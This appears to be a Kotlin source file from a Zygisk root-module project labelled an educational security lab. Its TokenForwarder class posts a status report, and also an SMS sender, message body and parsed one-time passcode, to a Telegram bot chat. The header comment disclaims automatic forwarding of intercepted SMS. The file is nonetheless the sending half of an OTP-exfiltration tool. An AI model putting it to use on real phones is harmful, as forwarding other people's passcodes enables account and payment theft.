package com.hivirtus.zygiskmode

import android.content.Context
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

/**
 * Educational Telegram helper — manual test messages and lab OTP sharing only.
 * Does not auto-forward intercepted SMS.
 */
class TokenForwarder(
    private val configManager: ConfigManager,
    private val context: Context? = null
) {

    private val client = OkHttpClient()

    fun sendTestMessage(botToken: String, chatId: String, health: ModuleHealth): Boolean {
        if (botToken.isBlank() || chatId.isBlank()) return false
        val text = buildString {
            appendLine("Zygisk Security Edu Lab")
            appendLine("Status: ${health.statusLine}")
            appendLine("Module ZIP: ${if (health.moduleInstalled) "Installed" else "Missing"}")
            appendLine("Zygisk: ${if (health.zygiskLoaded) "Loaded" else "Not loaded"}")
            appendLine("Telegram: ${if (health.telegramConfigured) "Configured" else "Not configured"}")
            appendLine()
            append("This is a manual test message from the educational lab app.")
        }
        return postTelegram(botToken, chatId, text)
    }

    fun sendLabOtp(botToken: String, chatId: String, sender: String, body: String, otp: String): Boolean {
        if (botToken.isBlank() || chatId.isBlank()) return false
        val text = buildString {
            appendLine("OTP Lab (manual share)")
            appendLine("Sender sample: $sender")
            appendLine("Parsed OTP: $otp")
            appendLine("Sample body:")
            append(body.take(500))
            appendLine()
            append("Shared manually from Zygisk Security Edu Lab.")
        }
        return postTelegram(botToken, chatId, text)
    }

    private fun postTelegram(botToken: String, chatId: String, text: String): Boolean {
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        val payload = JSONObject()
            .put("chat_id", chatId)
            .put("text", text)
            .put("disable_web_page_preview", true)
            .toString()
        return postJson(url, payload)
    }

    private fun postJson(url: String, payload: String): Boolean {
        val request = Request.Builder()
            .url(url)
            .post(payload.toRequestBody("application/json".toMediaType()))
            .build()

        return try {
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }
}
